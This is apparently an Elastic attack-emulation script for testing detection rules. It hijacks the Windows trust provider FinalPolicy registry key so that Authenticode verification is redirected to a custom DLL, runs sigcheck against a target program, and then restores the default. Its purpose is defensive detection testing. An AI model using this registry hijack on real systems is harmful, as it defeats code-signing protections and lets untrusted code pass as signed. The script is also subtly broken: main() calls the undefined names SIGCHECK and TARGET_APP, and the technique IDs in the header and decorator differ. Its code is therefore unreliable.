# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

# Name: Trust Provider Modification
# RTA: trust_provider.py
# ATT&CK: T1116
# Description: Substitutes an invalid code authentication policy, enabling trust policy bypass.

import logging

from . import OSType, RuleMetadata, _common, register_code_rta

log = logging.getLogger(__name__)


if _common.is_64bit():
    SIGCHECK_EXE = "bin/sigcheck64.exe"
    TRUST_PROVIDER_DLL = "bin/TrustProvider64.dll"
else:
    SIGCHECK_EXE = "bin/sigcheck32.exe"
    TRUST_PROVIDER_DLL = "bin/TrustProvider32.dll"

TARGET_APP_EXE = "bin/myapp.exe"


FINAL_POLICY_KEY = "Software\\Microsoft\\Cryptography\\providers\\trust\\FinalPolicy\\{00AAC56B-CD44-11D0-8CC2-00C04FC295EE}"  # noqa: E501


def set_final_policy(dll_path, function_name):
    winreg = _common.get_winreg()
    hkey = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, FINAL_POLICY_KEY)

    log.info("Setting dll path: %s" % dll_path)
    winreg.SetValueEx(hkey, "$DLL", 0, winreg.REG_SZ, dll_path)

    log.info("Setting function name: %s" % function_name)
    winreg.SetValueEx(hkey, "$Function", 0, winreg.REG_SZ, function_name)


@register_code_rta(
    id="45541eb5-c636-477b-81c9-b6dcf184c9cc",
    name="trust_provider",
    platforms=[OSType.WINDOWS],
    endpoint_rules=[],
    siem_rules=[RuleMetadata(id="f2c7b914-eda3-40c2-96ac-d23ef91776ca", name="SIP Provider Modification")],
    techniques=["T1553"],
    ancillary_files=[SIGCHECK_EXE, TRUST_PROVIDER_DLL, TARGET_APP_EXE],
)
def main():
    log.info("Trust Provider")
    set_final_policy(TRUST_PROVIDER_DLL, "FinalPolicy")

    log.info("Launching sigcheck")
    _ = _common.execute_command([SIGCHECK, "-accepteula", TARGET_APP])

    log.info("Cleaning up")
    set_final_policy("C:\\Windows\\System32\\WINTRUST.dll", "SoftpubAuthenticode")
